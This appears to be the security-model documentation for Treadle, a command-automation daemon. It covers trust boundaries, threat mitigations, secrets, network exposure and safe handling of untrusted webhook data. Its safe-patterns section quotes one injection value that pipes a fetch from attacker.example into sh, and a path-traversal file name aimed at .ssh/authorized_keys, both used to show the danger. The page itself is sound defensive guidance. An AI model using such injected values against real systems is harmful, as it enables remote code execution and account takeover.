# Security model

Treadle runs commands on your machine when a clock ticks, a file appears, or a request
arrives. This page describes what Treadle protects, which attacks it defends against, how,
and what it leaves to you. To report a vulnerability, see [SECURITY.md](../SECURITY.md).

## What Treadle protects

- **Your shell access.** Steps run as the user who started Treadle, with that user's
  permissions.
- **Your secrets**, such as API tokens and webhook secrets.
- **The run history**, which can hold command output and trigger data.
- **The files** under the file roots that `file` steps may change.
- **The machine's availability**, against floods of requests and runaway steps.

## Trust boundaries

Treadle treats three groups as untrusted:

1. **Network clients:** webhook senders and browsers that reach the daemon.
2. **Untrusted data inside trusted workflows:** webhook bodies, headers, and query strings,
   the names of watched files, and HTTP responses. You trust the workflow, but not the data
   it handles. That data includes `trigger.delivery` and `trigger.content_type`, which come
   from request headers that no signature covers, so a replayed signed body can carry any
   values for them.
3. **Other users on the same machine.**

These are out of scope: anyone who controls your user account, because they can edit your
workflows; the root user; and physical access to the machine.

**Treadle isn't a sandbox.** A step can do anything that your user can do. Review a workflow
as you would review a shell script before you run it.

## Threats and mitigations

| Threat | Mitigations | What remains |
|---|---|---|
| Spoofed webhooks | Every hook needs a secret of at least 16 characters, and a hook without one is disabled (503). Treadle verifies the HMAC-SHA256 signature, or the shared token, before it parses the body, compares in constant time, and gives the same 401 answer for every failure. | A weak secret that you chose. |
| Replayed webhooks | Treadle remembers a digest of the hook name and the signed message, in the same transaction that creates the run, for `dedupe_window` (24 hours by default). It ignores delivery ID headers, which the signature doesn't cover. With `timestamp_header`, the signature covers a timestamp that must be within `tolerance`. | A sender that signs only the body, such as GitHub or Gitea, can be replayed after the window. Make webhook workflows safe to run twice. |
| Floods and resource exhaustion | Body limits, a per-hook rate limit after authentication, `max_queued`, `max_concurrent`, `max_parallel`, JSON nesting of at most 64 levels, at most 64 concurrent connections, and a 16 KiB limit on request headers. | The CPU time that verifying signatures costs during an unsigned flood. |
| Script injection from untrusted data | The [safe patterns](#safe-patterns-for-untrusted-data), and the lint warnings W101 through W103, which `treadle validate --strict` turns into failures. | Treadle doesn't quote values for you. An `argv` value that starts with `--` can still inject an option. |
| Secrets in logs and storage | Masking of secrets in every log line, stored value, error, and event file, and in the daemon's log, including numbers whose JSON text holds a secret. Secrets reach a step only when it asks for one. Treadle removes the token and webhook secret variables from the environment it passes to steps, writes scripts to files with mode 0600, and never logs request bodies or headers. `treadle serve` and `treadle run` warn when other users can read `.env` or access the state directory. W104 warns about a secret in `argv`. | Transformed secrets, such as base64-encoded values, aren't masked. See [Masking](expressions.md#masking). |
| Cross-site request forgery | `SameSite=Strict` cookies, signed form tokens bound to the session, a check of the `Sec-Fetch-Site` and `Origin` headers, API requests that must send JSON, and no CORS headers. | A browser that sends neither header and also ignores `SameSite`. |
| DNS rebinding against a loopback daemon | A `Host` header allowlist on loopback binds. | None known. |
| Unauthorized network access | A bind to any address other than loopback requires a token of at least 32 characters. Dashboard sessions are signed, bound to the token, `HttpOnly`, and expire. Treadle ignores `X-Forwarded-*` headers. | Plain HTTP on a network exposes the token. Use TLS, as described in [TLS and remote access](operations.md#tls-and-remote-access). |
| Cross-site scripting | Templates escape every value, there are no inline scripts or styles, and a strict Content Security Policy blocks everything else. Log text renders as text. | None known. |
| Path traversal and destructive file operations | `file` steps work only inside the file roots, checked on resolved paths and by file identity. They never change the state directory, and never delete or move a file root, the project directory, or the workflows directory. `delete` doesn't follow a final symbolic link, `overwrite` is off by default, and a merging copy refuses a destination link that leads outside the file roots. A watched folder that disappears never reports mass deletion. | A local attacker who can write to the directory and race the check, or plant a hard link. |
| Server-side request forgery through `http` steps | W103 for untrusted data in a URL, redirects off by default, and `http` and `https` only. The `http` step keeps no cookies, never reads the body of a redirect, and stops decompressing at `max_response_bytes`. | Private networks stay reachable on purpose, because home automation needs them. |
| Other local users | The state directory has mode 0700. The database, `secret.key`, `holder.json`, scripts, and event files have mode 0600. | On loopback without a token, any local user can call the API. Set a token on a shared machine. |
| Malicious YAML | A safe YAML loader, no anchors, aliases, or merge keys, duplicate keys rejected, a 1 MiB file limit, and at most 50 issues per file. | None known. |
| Code execution through expressions | Treadle's own parser and evaluator, JSON values only, no access to Python objects, a fixed list of functions, and limits on length, depth, and result size. | None known. |
| Runaway steps | Timeouts on every step and run, kills of whole process groups, background processes that stop when their run ends, and limits on logs and outputs. | No CPU or memory limits, and a process that leaves its process group with `setsid` escapes. Use systemd's `MemoryMax=`, `CPUQuota=`, and `KillMode=mixed`, as in [Run Treadle with systemd](operations.md#run-treadle-with-systemd). |
| Supply chain | Five direct runtime dependencies, Dependabot updates, no plugin loading, and a CI check for committed secrets. `uv.lock` pins every package for development and CI. | `uv tool install` and `pipx install` don't read `uv.lock`: they install the newest versions that `pyproject.toml` allows, so a compromised upstream release can reach you. To install the versions that CI tests, see [Install](../README.md#install). |

## Safe patterns for untrusted data

A template inside a `run` script becomes part of the script's code. If the value comes from a
webhook, a file name, or an HTTP response, whoever controls that value can run commands as
you.

```yaml
# Unsafe: the branch name becomes shell code.
- id: bad
  run: echo "Deploying ${{ trigger.body.ref }}"
```

A branch named `$(curl -s https://attacker.example | sh)` would run that command. Pass the
value through `env` instead, where the shell treats it as data:

```yaml
# Safe: the value arrives as data in an environment variable.
- id: good
  env:
    REF: ${{ trigger.body.ref }}
  run: echo "Deploying $REF"
```

Always quote the variable (`"$REF"`), so the shell doesn't split it into words.

Other safe patterns:

- **Read the event file.** Every step gets the trigger data as a JSON file at
  `$TREADLE_EVENT_PATH`. Read it with `jq` or with a `python` script, as
  [`examples/sort-downloads.yml`](../examples/sort-downloads.yml) does.
- **Check a value before you use it.** `examples/deploy-on-push.yml` rejects a commit ID that
  isn't hexadecimal before it passes the ID to Git.
- **Use `argv` for one program.** A `shell` step with `argv` runs the program without a
  shell, so no value becomes code. Put `--` before values that could start with `-`, so the
  program doesn't read them as options:

  ```yaml
  - id: search
    uses: shell
    with:
      argv: [grep, -F, --, "${{ trigger.body.query }}", notes.txt]
  ```

- **Keep untrusted values out of paths and URLs**, or check them first. A file name such as
  `../../.ssh/authorized_keys` changes what a path points at.

`treadle validate` warns about these cases:

| Code | Warning |
|---|---|
| W101 | Untrusted trigger data or HTTP response data in a `run` script. |
| W102 | An input or a step output in a `run` script. Inputs come from you, but a step output may hold untrusted data. |
| W103 | Untrusted trigger data or HTTP response data in a path or URL: `cwd`, `file` paths, or the `http` `url`. |
| W104 | A secret in `argv`, where process listings such as `ps` can show it. |

Untrusted trigger data is a webhook's `body`, `headers`, `query`, `content_type`, and
`delivery`, and a watch's `changes` and `paths`. `content_type` and `delivery` come from
request headers that no signature covers, so a replayed signed body can carry any values
for them. The other fields of a schedule, a watch, or a manual run come from Treadle.

Each warning's hint shows the fix. For W101 and W102, the hint gives an `env` entry that you
can paste into the step as written, such as `env: {VALUE: "${{ trigger.body.ref }}"}`. To
fail a CI job on these warnings, run `treadle validate --strict`.

## Secrets

- Keep secrets in the project's `.env` file with mode 0600 (`chmod 600 .env`), or in
  `TREADLE_SECRET_<NAME>` environment variables. `treadle serve` and `treadle run` warn when
  other users can read `.env`. `treadle init` adds `.env` to `.gitignore`. For the file's
  format, see [The .env file](expressions.md#the-env-file).
- A step receives a secret only through `${{ secrets.NAME }}`. Put it in the step's `env`,
  not in `argv`, because other users can read a process's arguments.
- Treadle removes `TREADLE_*` variables, the token variable, and every webhook secret
  variable from the environment that steps inherit.
- Treadle writes `run` scripts to files with mode 0600, so a script, and any secret rendered
  into it, never shows up in a process listing.
- For what masking covers and its limits, see [Masking](expressions.md#masking).

## Network exposure

By default, `treadle serve` listens on `127.0.0.1` port 8765, and needs no token. Any process
on the machine can reach it, including other users' processes.

- **On a machine that other people use, set a token**, even on loopback. Put
  `TREADLE_TOKEN=<at least 32 random characters>` in `.env`, and restart `treadle serve`. To
  make a token, run `python3 -c "import secrets; print(secrets.token_urlsafe(32))"`.
- **To listen on another address**, set `[server] host` or `--host`. Treadle refuses to start
  without a token on any address other than loopback, and refuses a token shorter than 32
  characters.
- **A change to the token takes effect only after a restart.** When `.env` sets, changes, or
  removes the token while `treadle serve` runs, the daemon logs a warning, keeps accepting
  only the token that it started with, and keeps masking that token. Removing the token
  from `.env` never turns authentication off before a restart. For the warnings, see
  [Signals](operations.md#signals).

With a token set:

- API clients send `Authorization: Bearer <token>`.
- The dashboard asks for the token once, on its sign-in page, and then uses a session
  cookie. The cookie is `HttpOnly` and `SameSite=Strict`, is signed with
  `.treadle/secret.key`, and expires after `[server] session_ttl` (12 hours by default).
  A restart with a new token signs everyone out. So does the next start after you delete
  `secret.key`, because `treadle serve` reads the key only when it starts.
- `/api/v1/health`, the static files, the sign-in page, and the webhook endpoints need no
  token. Webhooks prove themselves with their signatures.

Other protections:

- **Forms** carry a signed token that is bound to the session. Treadle refuses a form or API
  request from another site: when the browser sends `Sec-Fetch-Site`, it must be
  `same-origin` or `none`; otherwise, an `Origin` header must match the server.
- **The `Host` header** must name the daemon on a loopback bind: `127.0.0.1`, `localhost`,
  `[::1]`, the address it listens on, or a name in `[server] allowed_hosts`. This blocks DNS
  rebinding, where a web page tricks your browser into calling a local port. On any other
  bind, the token protects every route, so Treadle accepts any `Host` unless you list names
  in `allowed_hosts`. Webhooks skip this check, because a tunnel or proxy may forward them
  with any `Host`.
- **Every response** carries a strict Content Security Policy, `X-Frame-Options: DENY`,
  `X-Content-Type-Options: nosniff`, and `Referrer-Policy: no-referrer`. Every response
  except the dashboard's static files also carries `Cache-Control: no-store`.

Treadle serves plain HTTP. To reach it from another machine, put TLS in front of it with a
reverse proxy, an SSH tunnel, or a VPN such as Tailscale. See
[TLS and remote access](operations.md#tls-and-remote-access).

## Files

- `file` steps may change only paths inside `[security] file_roots`, which default to the
  project directory and your home directory. Narrow the list to what your workflows need:

  ```toml
  [security]
  file_roots = ["~/Documents/PDFs", "/srv/backups"]
  ```

- Treadle compares a `file` step's paths with the file roots and the protected directories
  by file identity, so another spelling of a path, on a file system that ignores letter
  case, doesn't get around them. A copy that merges into a directory refuses a symbolic
  link in the destination that leads outside the file roots or into the state directory.
- `shell` steps aren't limited by `file_roots`. A script can change any file that your user
  can.
- A watched folder that disappears makes the trigger degraded, and a folder that becomes a
  different directory, such as the empty mount point of an unmounted drive, gets a new
  silent baseline. Neither reports every file as deleted.

## Limits on resources

Treadle bounds what one workflow, request, or step can consume:

- Every step attempt and every run has a timeout. Stopping a step kills its whole process
  group, and Treadle stops the processes that a step left in the background when the run
  ends.
- Log and output limits cap what a step stores, and a step keeps running after it reaches
  them.
- Body limits apply to webhooks and API requests, and the daemon serves at most 64
  connections at once.

Treadle doesn't limit CPU time or memory. To limit them, run Treadle under systemd with
`MemoryMax=` and `CPUQuota=`, or in a container with `--memory` and `--cpus`. See
[Run Treadle with systemd](operations.md#run-treadle-with-systemd) and
[Run Treadle in a container](operations.md#run-treadle-in-a-container).
